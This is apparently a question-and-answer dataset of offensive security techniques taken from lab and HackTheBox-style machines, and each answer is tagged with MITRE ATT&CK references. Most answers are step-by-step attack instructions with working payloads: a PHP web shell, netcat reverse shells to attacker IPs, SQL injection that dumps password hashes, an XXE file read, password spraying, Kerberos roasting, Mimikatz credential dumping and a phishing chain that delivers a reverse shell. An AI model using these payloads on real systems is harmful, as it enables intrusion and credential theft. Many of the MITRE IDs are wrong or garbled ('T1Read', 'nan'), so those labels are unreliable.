A: To exploit the Bolt CMS and gain access to the www-data user, we can follow these steps:1. After gaining access to the Docker registry and downloading the repository files, we can find that the Bolt CMS is running on the server.2. We can download the Bolt CMS database file `/var/www/html/bolt/app/database/bolt.db` using SCP.3. Analyzing the database file, we can obtain the admin user's password hash from the `bolt_users` table.4. Using a tool like `john` or `hashcat`, we can crack the password hash and gain access to the Bolt CMS as the admin user.5. Once logged in, we can navigate to the Configuration > Main Configuration section and modify the allowed file types to include the PHP extension.6. We can then upload a web shell, such as `<?php echo exec($_GET["cmd"]);?>`, using the File Manager.7. Navigating to the web shell (e.g., `shell.php`) will give us command execution in the context of the www-data user. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can we exploit the Restic backup utility to escalate privileges to root?
A: To exploit the Restic backup utility to escalate privileges to root, we can follow these steps:1. After gaining access as the www-data user, we can run `linpeas` or another enumeration script to discover the Restic backup utility.2. We can see that the www-data user has permission to run Restic as root using `sudo`.3. We can set up a Restic REST server on our local machine using Docker:   - `docker pull restic/rest-server`   - `docker run -p 8000:8000 -v /var/www/html/repo:/data --name rest_server restic/rest-server`   - `docker exec -it rest_server create_user user` (set a password for the user)4. We can then perform a remote port forward to make the Restic REST server available from the target machine:   - `ssh -i id_rsa bolt@registry.htb -R 8000:127.0.0.1:8000`5. Now, we can use the www-data user's Restic permissions to backup the root folder to the remote server under our control:   - `sudo -u www-data restic -r rest://127.0.0.1:8000/backup backup /`6. After the backup is complete, we can mount the backup repository and access the root folder contents:   - `cd /var/www/html/repo/root/snapshots/latest/root/` MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use NoSQL injection to bypass authentication in a MongoDB-based web application?
A: NoSQL injection can be used to bypass authentication in a MongoDB-based web application by exploiting weak comparisons in the authentication logic. The $ne (not equal) operator in MongoDB can be leveraged to create a query that will return true even with an incorrect password. For example, sending the parameter "password[$ne]=admin" will create a query like "db.users.find({ username: "admin", password: { $ne : "admin" } })" which will return true because the password is not equal to "admin". This can be automated using a script to brute-force usernames and passwords. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001, Initial Access.

## Q: How could the Redis server on the Postman machine be exploited to gain access?
A: The Redis server on Postman was running version 4.0.9 without authentication enabled. This allowed for unauthenticated command execution and file writes. By connecting to the Redis server with redis-cli and checking the configuration, it was possible to confirm the default folder was /var/lib/redis. This allowed writing an SSH public key to the .ssh/authorized_keys file, which gave SSH access as the Redis user. MITRE References: MITRE ID is T1106, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: What technique was used to escalate privileges from the Redis user to root on the Postman machine?
A: The Postman machine was found to have an older version of Webmin running (1.910) that was vulnerable to command injection. By intercepting the request to the /package-updates/update.cgi endpoint and injecting a command into the u parameter, it was possible to execute a bash reverse shell and gain a root shell. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: What is the SQL injection vulnerability in the speech recognition service and how can it be exploited to gain SSH credentials?
A: The speech recognition service is vulnerable to SQL injection via the file upload functionality. By injecting a single quote character into the input text, a MySQL SQL error is triggered, indicating the presence of a vulnerable backend database. To exploit this, we can use a carefully crafted SQL injection query to retrieve the username and password for an SSH user account. This involves using a UNION SELECT query to retrieve the username and password from the users table and appending a comment to balance the single quote. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can we leverage the Java Debugging Wire Protocol (JDWP) to gain code execution as root on the Tomcat server?
A: The Tomcat server is running with the JDWP debug agent enabled, listening on localhost port 8000. We can forward this port to our local machine and attach to the Tomcat process using the jdb debugger. Once attached, we can set a breakpoint on the init() method of a javax class, which will be hit when the Tomcat servlet starts up. At this point, we can leverage the Runtime.exec() method to execute arbitrary code as the root user running the Tomcat process. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a Remote Code Execution vulnerability in the Nostromo Web Server version 1.9.6?
A: To exploit the Remote Code Execution vulnerability in the Nostromo Web Server version 1.9.6, you can use a Python script exploit or the Metasploit module. 

Manual Exploitation:
- Download the Python exploit script
- Run the script with the target IP and port as arguments to execute commands (e.g. "python exploit.py 10.10.10.100 80 id")
- To get a reverse shell, use "python exploit.py 10.10.10.100 80 "nc -e bash 10.10.14.22 1234""

Metasploit Exploitation:
- Start Metasploit ("msfconsole")
- Use the "exploit/multi/http/nostromo_code_exec" module ("use exploit/multi/http/nostromo_code_exec")
- Set the remote host IP ("set rhosts 10.10.10.100")
- Set the local host IP ("set lhost 10.10.14.20")
- Run the module ("run") MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: TA0009.

## Q: How can you enumerate the number of columns in a table using SQL injection?
A: To enumerate the number of columns in a table using SQL injection, you can try the following techniques:

1. ORDER BY clause: Append an ORDER BY clause with an increasing column index until you get an error, e.g. 'test' ORDER BY 2-- - , 'test' ORDER BY 3-- -, etc. The maximum column index that doesn't error out will give you the number of columns.

2. UNION SELECT: Attempt a UNION SELECT with an increasing number of columns, e.g. 'test' UNION SELECT 1,2,3,4,5-- -, 'test' UNION SELECT 1,2,3,4,5,6-- -. The maximum number of columns that doesn't error out will give you the column count. MITRE References: MITRE ID is T1008, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: TA0009.

## Q: How can you extract MySQL user password hashes using SQL injection?
A: To extract MySQL user password hashes using SQL injection, you can use the following query:

test' UNION SELECT 1,2,3,4,GROUP_CONCAT(user,"::",password,"\n"),6 FROM mysql.user-- -

This will concatenate the MySQL user, a separator (::), the password hash, and a newline for each user, and return the results in the fifth column. You can then attempt to crack the hashes offline using a tool like hashcat. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you leverage a service to gain SYSTEM privileges on a Windows Server 2019 system?
A: To gain SYSTEM privileges on a Windows Server 2019 system, you can leverage a service with the following characteristics:

1. Running as NT AUTHORITY\SYSTEM
2. Configured with a manual start type
3. Permissions on the HKLM:\SYSTEM\CurrentControlSet\Services registry key that allow you to modify the service binary path

You can use PowerShell to enumerate such services and modify the binary path to execute a reverse shell. For example:

$result = $_ | Invoke-CimMethod -Name StartService
[pscustomobject]@{ Result=$result.ReturnValue
  Name=$_.Name Account=$_.StartName Startup=$_.StartMode DisplayName=$_.Displayname }
} | Sort Name | Where { ($_.Result -eq 0) -and ($_.Account -eq "LocalSystem") -and ($_.Startup -eq "Manual") }

Once you've identified a suitable service, you can modify its binary path to execute a reverse shell, e.g.:

Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\seclogon -Name "ImagePath" -Value "\\10.10.14.3\Public\nc.exe -e powershell.exe 10.10.14.3 8000"
Start-Service seclogon MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: TA0004.

## Q: How can you leverage a known-plaintext attack to recover an encryption key and decrypt sensitive information?
A: To leverage a known-plaintext attack to recover an encryption key and decrypt sensitive information:1. Obtain the plaintext and ciphertext files. On the remote system, you can base64 encode these files and then decode them locally.2. Write a script to subtract the plaintext from the ciphertext, character by character, to reveal the key used for the encryption.3. With the recovered key, you can use the decryption function from the source code to decrypt the sensitive information, such as a password file.4. Use the decrypted password to move laterally and gain access to other user accounts on the system. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you leverage a race condition and sudo argument overwriting to escalate privileges to root on a system?
A: To escalate privileges to root by leveraging a race condition and sudo argument overwriting:1. Identify a script that can be run as the user robert with sudo privileges, such as BetterSSH.py.2. Observe that the script temporarily stores /etc/shadow entries in a random file under /tmp/SSH before deleting it.3. Create the /tmp/SSH directory and start a loop to copy anything created in this directory to /tmp.4. Execute the BetterSSH.py script and authenticate successfully as robert. This will create the random file in /tmp/SSH, which will be copied to /tmp.5. Use John the Ripper to crack the password hashes in the copied file and gain the root password.6. Alternatively, inspect the BetterSSH.py script and observe that it appends 'sudo -u' to every command executed. By specifying additional '-u <user>' options, you can overwrite this initial assignment and execute commands as root.7. Create a reverse shell script and execute it through the BetterSSH.py session to gain a root shell. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you bypass user agent filtering to access hidden directories on a Node.js server?
A: To bypass user agent filtering, modify the User-Agent header in the request to contain the word 'Linux' when making requests to the Node.js server. This can be done using tools like Burp Suite or by manually crafting the HTTP requests. The specific command to bypass the user agent filtering is to run DirBuster with a custom User-Agent header containing 'Linux'. MITRE References: MITRE ID is T1132, MITRE Name is: Data Encoding, and MITRE Tactics are: Defense Evasion, Exfiltration.

## Q: How can you leverage command injection vulnerabilities in a Node.js application to download a reverse shell?
A: To download a reverse shell using command injection, you can escape the table name parameter in the /admin page and inject system commands. Start the table name with %2f%26 to allow for unrestricted command injection. Use the IP address in decimal format (e.g., 168431110) to bypass restrictions on using periods, and run a wget command to download the reverse shell binary. Alternatively, run a Python SimpleHTTPServer on port 80 to serve the reverse shell and use the command injection to download it. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: How can NTLM hashes be cracked quickly?
A: NTLM hashes can be cracked quickly using high-powered GPU cracking tools like Hashcat. It is possible to test over 600 billion NTLM hashes per second, allowing 8-character passwords to be cracked in 2.5 hours and 9-character passwords in 11 days. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker use the ntds.dit file to obtain user password hashes in a Windows domain?
A: Attackers can use the ntds.dit file, which contains the password hashes for all domain users, to obtain user credentials. This file is typically located on the domain controller and can be accessed using techniques like:- Volume Shadow Copy (MITRE T1003.003)- Dumping the file directly from the domain controller- Leveraging a domain administrator account to access the fileOnce obtained, the hashes can be cracked offline using tools like Hashcat to recover the plaintext passwords. MITRE References: MITRE ID is T1003.003, MITRE Name is: NTDS, and MITRE Tactics are: Credential Access.

## Q: How can you modify a user's account settings to enable AS-REP Roasting if the account does not already have the 'Do not require Kerberos preauthentication' option enabled?
A: If you have GenericWrite or GenericAll permissions on another Active Directory user account, you can leverage those permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. However, you should reset the User Account Control value of the user once you have obtained the hash. MITRE References: MITRE ID is T1558.004, MITRE Name is: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, CredentialAccess.

## Q: What steps can an attacker take to crack the NTLM hash obtained from a dcsync attack?
A: After obtaining the NTLM hash of a domain user through a dcsync attack, the attacker can attempt to crack the hash using tools like Hashcat. The attacker can copy the NTLM hash to a file on their own system, then run Hashcat using a mode of 1000, a wordlist like rockyou.txt, and a rule file like best64.rule. The attacker can also use the --force option if running Hashcat in a VM. This allows the attacker to retrieve the plaintext password of the domain user. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you perform a password spray attack to find a valid user account on a domain controller?
A: To perform a password spray attack to find a valid user account on a domain controller, you can use a bash script to loop through a list of users and test the password 'Welcome123!'. For example:for u in $(cat users | awk -F@ '{print $1}' | awk -F: '{print $2}'); do rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.10.10.111 | grep Authority; done MITRE References: MITRE ID is TA0006, MITRE Name is: Credential Access, and MITRE Tactics are: T1110.

## Q: How can you identify and exploit a vulnerability in a web application that allows reading of arbitrary files?
A: To identify and exploit a vulnerability that allows reading of arbitrary files, you can use techniques like XML External Entity (XXE) Injection. First, identify if the web application accepts XML input, such as via a document upload feature. Then, craft a malicious XML document that references an external entity to retrieve sensitive files like /etc/passwd. For example, you can use a payload like "<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>". This will cause the application to fetch the /etc/passwd file and return it in the response. To automate this, you can use tools like XXEinjector or the XXE exploit module in Metasploit (version 6.0.28). MITRE References: MITRE ID is T1Read, MITRE Name is: Obtain Sensitive Information, and MITRE Tactics are: TA0009.

## Q: How can you use .NET tools and source code analysis to decrypt passwords stored in configuration files?
A: In the Nest machine, the encrypted password was stored in an XML configuration file. By analyzing the source code of a .NET application that was using this password, we were able to reverse engineer the decryption logic and write a C# program to decrypt the password.The key steps are:1. Decompile the .NET binary using a tool like dnSpy to view the source code.2. Identify the decryption method and the parameters used (e.g. passphrase, salt, IV, key size).3. Recreate the decryption logic in a new C# program, using the System.Security.Cryptography namespace.4. Run the decryption program, passing in the encrypted password, to obtain the plaintext password.This technique allows you to decrypt passwords that have been obfuscated or stored in a secure manner within .NET applications. It requires reverse engineering skills and knowledge of .NET cryptography APIs. MITRE References: MITRE ID is T1003.001, MITRE Name is: OS Credential Dumping: LSASS Memory, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform a Path Traversal attack on a Java application?
A: To perform a Path Traversal attack on a Java application, you can try the following steps:1. Decompile the Java application using a tool like jd-gui to analyze the source code. 2. Look for functions that accept a folder name as input and check if the input is properly sanitized.3. If the input is not sanitized, try to perform a Path Traversal attack by injecting "../" or "../../" in the folder name.4. Recompile the modified application and run it to see if you can access files outside the intended directory.This type of vulnerability allows an attacker to access sensitive files on the server by traversing the file system. It is important to properly sanitize all user input in a Java application to prevent such attacks. MITRE References: MITRE ID is T1570, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a SQL Injection vulnerability in a Java application to gain administrator access?
A: To exploit a SQL Injection vulnerability in a Java application, you can try the following steps:1. Identify the SQL query that is vulnerable to injection by decompiling the Java application and analyzing the source code.2. Craft a SQL injection payload that can be used to create a new administrative user. For example, you can try a payload like "' UNION SELECT 1,'admin','password','admin' -- ".3. Modify the client-side code to send the malicious payload to the server instead of the normal login credentials.4. Rebuild the Java application with the modified client code and run it to see if you can log in as the new administrative user.This type of vulnerability allows an attacker to bypass authentication and gain unauthorized access to the application's functionality. It is important to properly sanitize all user input and use parameterized queries to prevent such attacks. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can you exploit a Java Deserialization vulnerability to gain a reverse shell on a server?
A: To exploit a Java Deserialization vulnerability, you can try the following steps:1. Identify the vulnerable Java library being used by the application by decompiling the Java application and analyzing the source code.2. Generate a malicious serialized payload using a tool like ysoserial (version 1.0) that can execute system commands when deserialized.3. Modify the client-side code to send the malicious payload to the server instead of the normal data.4. Rebuild the Java application with the modified client code and run it to trigger the deserialization vulnerability and execute the payload.5. Set up a listener on your machine to catch the reverse shell connection from the server.This type of vulnerability allows an attacker to execute arbitrary code on the server by abusing the Java deserialization process. It is important to properly validate and sanitize all serialized data to prevent such attacks. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you use a Tar Exploit to gain root access on a Linux machine?
A: To exploit a Tar vulnerability to gain root access, you can try the following steps:1. Identify a writable directory that is periodically backed up by a cron job running as root.2. Create a symlink in the writable directory that points to the root user's .ssh/authorized_keys file.3. Add the symlink to a tar archive and copy it to the writable directory.4. Wait for the cron job to run and extract the tar archive, which will overwrite the .ssh/authorized_keys file with the symlink.5. Add your public SSH key to the .ssh/authorized_keys file and log in as the root user.This type of vulnerability allows an attacker to gain root access by exploiting the way Tar handles file permissions and symlinks during the extraction process. It is important to properly configure cron jobs and file permissions to prevent such attacks. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can we use ASREPRoasting to extract password hashes from user accounts that do not require Kerberos pre-authentication?
A: Kerberos pre-authentication is a security feature that provides protection against password-guessing attacks. When pre-authentication is not enforced, one could directly send a dummy request for authentication. The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and return an encrypted Ticket Granting Ticket (TGT). The TGT contains material (the timestamp) that is encrypted with the NTLM hash of the corresponding account. A hash can be derived from this, that can be subjected to an offline brute force attack in order to reveal the plaintext password. Using Impacket's GetNPUser.py, we can attempt an ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication. A simple bash command can be used to execute this attack, and iterate through a list of usernames: while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt MITRE References: MITRE ID is T1558.004, MITRE Name is: Kerberoasting, and MITRE Tactics are: CredentialAccess.

## Q: How can we use WinRM to gain remote access to a Windows system and perform privilege escalation?
A: Windows Remote Management (WinRM) is a Windows-native built-in remote management protocol and it is often enabled for users that need to manage systems remotely. We can use a tool like evil-winrm to connect to the remote system using valid credentials. Once we have a WinRM session, we can use a script such as WinPEAS to automate enumeration tasks and identify potential privilege escalation opportunities, such as finding a user account configured for automatic login with a known password. We can then use evil-winrm to login as this user and potentially gain higher-level access on the system. MITRE References: MITRE ID is T1021.006, MITRE Name is: Remote Services: Windows Remote Management, and MITRE Tactics are: Lateral Movement.

## Q: How can we use a DCSync attack to dump password hashes from a Domain Controller?
A: A DCSync attack allows an attacker with the necessary privileges to impersonate a domain controller and request password data for any user in the domain. This is done by exploiting the directory replication process, which allows domain controllers to synchronize their data. Bloodhound can be used to identify users with the 'DS-Replication-Get-Changes-All' extended right, which grants the ability to perform a DCSync attack. Impacket's secretsdump.py can then be used to execute the attack and dump the NTLM password hashes for all domain users, including the primary domain administrator. MITRE References: MITRE ID is T1003.006, MITRE Name is: OS Credential Dumping: DCSync, and MITRE Tactics are: Credential Access.

## Q: How can you reuse a Kerberos Ticket Granting Ticket (TGT) to gain remote code execution on another system?
A: After converting the NTLM hash into a Kerberos TGT using the overpass the hash technique, you can reuse the TGT to obtain a Ticket Granting Service (TGS) for the Common Internet File System (CIFS) service on a remote system. This allows you to use tools like PsExec to execute commands remotely on the target system without needing to provide a password hash. MITRE References: MITRE ID is T1550.002, MITRE Name is: Pass the Hash, and MITRE Tactics are: Lateral Movement.

## Q: What are some stealthy techniques a penetration tester can use to maintain long-term access to a compromised Active Directory environment?
A: Instead of leaving an access trail by uploading tools, a penetration tester can abuse Active Directory functionality itself to maintain persistence in a stealthy manner. One technique is to move laterally to the domain controller and use Mimikatz to dump password hashes using the DCSync method. This avoids uploading additional tools and leaves fewer traces compared to other credential dumping approaches. MITRE References: MITRE ID is T1484, MITRE Name is: Group Policy Modification, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can the uWSGI protocol be used to interact with a Flask application and modify the REMOTE_ADDR variable to execute arbitrary commands?
A: uWSGI is a protocol used to communicate with Python-based web applications. By sending crafted requests to the uWSGI socket, it is possible to modify the REMOTE_ADDR environment variable and inject arbitrary commands that will be executed by the web application with the privileges of the www-data user. This can be achieved by using a script that constructs the uWSGI packet structure and sends the malicious request to the exposed Unix socket. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: TA0007.

## Q: How can you use Hashcat to brute force Kerberos AS-REP tickets?
A: You can use Hashcat to brute force Kerberos AS-REP tickets obtained through the ASREPRoasting technique. First, save the obtained hash to a file. Then, use the Hashcat mode 18200 which corresponds to Kerberos 5 AS-REP etype 23. Run Hashcat with the -a 0 mode for a dictionary attack using a wordlist like rockyou.txt. The command would be: hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force MITRE References: MITRE ID is T1558.004, MITRE Name is: Steal or Forge Kerberos Tickets: AS-REP Roasting, and MITRE Tactics are: CredentialAccess.

## Q: How can you abuse the GenericWrite permission on a domain user account to escalate privileges?
A: If you have GenericWrite permission on a domain user account, you can abuse this to disable Kerberos pre-authentication for that user account. This allows you to perform an ASREPRoasting attack to obtain the user's password hash, which you can then crack offline. You can use the Get-ADUser and Set-ADAccountControl PowerShell cmdlets to disable pre-authentication for the target user account. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: LateralMovement, PrivilegeEscalation.

## Q: How can you leverage the CVE-2020-1472 Zerologon vulnerability to escalate privileges on a Windows domain?
A: The CVE-2020-1472 Zerologon vulnerability allows an attacker to authenticate anonymously to the Netlogon server service on a Domain Controller. Once authenticated, the attacker can set the domain controller's machine account password to a known value, which can then be used to perform a DCSync attack and retrieve the domain administrator's password hashes. This can be done using the Impacket secretsdump.py tool. MITRE References: MITRE ID is T1558.001, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: PrivilegeEscalation, LateralMovement.

## Q: How can you abuse the SeBackupPrivilege to read sensitive files on a Windows system?
A: The SeBackupPrivilege allows a user to access files and directories they don't own or have permission to access. You can use the built-in robocopy utility with the /b switch to copy protected files, such as the Administrator's desktop folder. This can be used to read sensitive data that the user has access to. MITRE References: MITRE ID is T1078.003, MITRE Name is: Valid Accounts: Local Accounts, and MITRE Tactics are: PrivilegeEscalation.

## Q: How can you use Lua to execute code as a different user on a compromised system?
A: To execute code as a different user using Lua, you can follow these steps:1. Create a Lua script that will execute a system command. For example, to get a Bash shell as the sysadmin user, you can use the following script:```luarequire('os');os.execute('/bin/bash');```2. Save the script to a file, e.g., `priv.lua`.3. If you have permission to run a specific program as the target user, you can execute the Lua script using that program. For example, if you can run `/home/sysadmin/luvit` as the sysadmin user, you can use the following command:```sudo -u sysadmin /home/sysadmin/luvit ./priv.lua```This will execute the Lua script and run the `/bin/bash` command as the sysadmin user, effectively allowing you to gain a shell as that user.The key is to find a program that you can execute as the target user, and then use that to run your Lua code to escalate privileges. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: Lua, and MITRE Tactics are: Execution.

## Q: How can you exploit a vulnerable version of Umbraco CMS to gain a foothold on a target system?
A: Umbraco CMS version 7.12.4 contains an authenticated remote code execution vulnerability that can be exploited to gain a foothold on the target system. You can download a public exploit and modify it to include the valid Umbraco administrator credentials (e.g. admin@htb.local / baconandcheese). The exploit will allow you to execute arbitrary PowerShell commands on the target, such as downloading and executing a reverse shell payload. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you extract credentials from a vulnerable version of TeamViewer on a target system?
A: Versions of TeamViewer up to 14.7.1965 store user passwords in the Windows registry in AES-128-CBC encrypted format, using a known key and IV. You can use the Metasploit 'teamviewer_passwords' module (post/windows/gather/credentials/teamviewer_passwords) to extract these credentials from the target system. This module will decrypt the stored password, which could potentially be reused for privilege escalation. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006.

## Q: How can you use the PrintSpoofer exploit to gain SYSTEM privileges on a Windows Server 2019 host?
A: The PrintSpoofer exploit can be used to abuse the SeImpersonatePrivilege on Windows Server 2019 to gain SYSTEM-level access. First, compile the PrintSpoofer.exe binary using Visual Studio. Then, upload the binary to the target host and execute it. This will impersonate the SYSTEM account and provide you with a SYSTEM-level shell, allowing you to access sensitive files and resources on the system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004.

## Q: How can you use SMB enumeration to gain access to files and shares on a Windows machine?
A: To enumerate SMB shares, you can use the smbclient tool. First, list the available shares with the command 'smbclient -L <ip_address>'. This will show all the shares on the target system. To access a specific share, use 'smbclient \\<ip_address>\<share_name> -U <username>'. This will allow you to browse the contents of the share. You can also use smbmap to enumerate shares and permissions: 'smbmap -H <ip_address> -u <username> -p <password>'. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: TA0006, Lateral Movement.

## Q: How can you use reverse engineering techniques to analyze a .NET executable and extract sensitive information?
A: To reverse engineer a .NET executable, you can use a tool like dnSpy. First, download and install dnSpy. Then, open the executable in dnSpy and navigate to the main function. Review the code to identify any sensitive information like encryption keys, passwords, or other valuable data. You can also use dnSpy to debug the application and step through the code to understand its functionality. MITRE References: MITRE ID is T1059.006, MITRE Name is: Command and Scripting Interpreter: Python, and MITRE Tactics are: TA0002, Execution.

## Q: How can custom cryptography be attacked and reversed to recover sensitive information?
A: When a custom cryptographic algorithm is used, it can often be reversed engineered through analysis of the code and brute-force techniques. In the example, the 'encrypter.py' script implemented a simple Caesar-like cipher that could be defeated by iterating through all possible key lengths and key values. A Python script was created to automate this process, first reversing the encryption by subtracting fixed values, and then brute-forcing the key by trying all 256 possible ASCII character offsets. By searching the decrypted output for keywords like 'key', the actual decryption key was recovered and used to decrypt the sensitive information. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you perform a Directory Traversal attack to retrieve the contents of /etc/passwd?
A: To perform a Directory Traversal attack to retrieve the contents of /etc/passwd, you can use the Python script obtained from SearchSploit. The script sends a GET request to a URL with a filename prepended by "dot dot slash" expressions to traverse the directory structure and access the /etc/passwd file. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: How can you leverage an SSH private key obtained through a Directory Traversal attack to access the target system?
A: To leverage an SSH private key obtained through a Directory Traversal attack, you need to save the key to a file (e.g., id_rsa), modify the file permissions to be read-only (chmod 400 id_rsa), and then use the ssh command with the `-i` option to specify the private key file and access the target system. MITRE References: MITRE ID is T1134.001, MITRE Name is: Access Token Manipulation: Token Impersonation/Theft, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you crack the passphrase of an SSH private key obtained through a Directory Traversal attack?
A: To crack the passphrase of an SSH private key, you can use the ssh2john tool to convert the private key into a format that John the Ripper can use, and then run John the Ripper with a wordlist like rockyou.txt to attempt to crack the passphrase. MITRE References: MITRE ID is T1110.002, MITRE Name is: Brute Force: Password Cracking, and MITRE Tactics are: Credential Access.

## Q: How can sensitive information be extracted from a Git repository on a target system?
A: If a Git repository is discovered on the target system, it can be examined for sensitive information. Some key steps include:1. Navigate to the Git repository directory using the cd command.2. Use git status to display the current state of the repository and git log to view the commit history.3. Look for any commits that may have removed sensitive information or functionality, as this could reveal interesting details.4. Use git show to display the differences between commits and identify any credentials, scripts, or other sensitive data that was previously committed. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Collection.

## Q: What are the steps to perform a client-side attack by sending a phishing email?
A: To perform a client-side attack by sending a phishing email, the steps are:1. Set up a WebDAV server, Python3 web server, and Netcat listener on your Kali machine.2. Create a Windows Library file and a shortcut file on the target machine (WINPREP) to download and execute PowerCat, creating a reverse shell.3. Serve the PowerCat script via the Python3 web server.4. Start a Netcat listener to catch the incoming reverse shell.5. Create an email body with a pretext and attach the Windows Library file.6. Use the swaks command-line SMTP tool to send the email to the target users.7. Wait for the victim to click the attachment, which will download PowerCat and establish a reverse shell to your Netcat listener. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Persistence, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control.

## Q: What are the benefits of using a WebDAV share instead of a Python3 web server for serving the malicious payload?
A: Using a WebDAV share instead of a Python3 web server for serving the malicious payload provides additional flexibility. The WebDAV share can be used to serve the payload directly, without the need for a separate web server. This can simplify the setup and make it easier to manage the attack infrastructure. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you improve the chances of success for a phishing attack?
A: To improve the chances of success for a phishing attack, you should:1. Conduct passive information gathering to obtain more details about potential targets, such as their roles, interests, and communication style.2. Use this information to create more tailored and personalized emails that are more likely to convince the victim to open the attachment.3. Incorporate details or references that are only known to employees or staff of the target organization to increase the perceived legitimacy of the email.4. Carefully craft the email body and subject line to make the phishing attempt more convincing. MITRE References: MITRE ID is T1598, MITRE Name is: Phishing for Information, and MITRE Tactics are: Reconnaissance.

## Q: How can we extract the NTLM hash for the user 'daniela' from the MAILSRV1 system?
A: To extract the NTLM hash for the user 'daniela', we can use Mimikatz, a popular post-exploitation tool. First, we need to download the latest version of Mimikatz from the official GitHub repository (https://github.com/gentilkiwi/mimikatz/releases) and serve it on our Kali machine using a Python3 web server. Then, on the MAILSRV1 system, we can download Mimikatz using the 'iwr' (Invoke-WebRequest) cmdlet and launch it. Once Mimikatz is running, we can use the 'privilege::debug' command to obtain the necessary privileges, and then use the 'sekurlsa::logonpasswords' command to extract the NTLM hash for the 'daniela' user. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: What steps can we take to enhance the shell we have obtained on MAILSRV1 after gaining privileged code execution?
A: After gaining privileged code execution on MAILSRV1, we should look to upgrade the shell to a more robust Meterpreter shell. This can be done by downloading a previously created Meterpreter reverse shell payload (e.g., 'met.exe') and executing it on the target system. By upgrading to Meterpreter, we'll have access to a wider range of post-exploitation capabilities, such as file transfer, keylogging, and privilege escalation. Additionally, we should perform local enumeration on the MAILSRV1 system to uncover any additional vulnerabilities or sensitive information that may have been missed. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can we use Mimikatz to extract the clear text password and NTLM hash for the domain administrator 'beccy'?
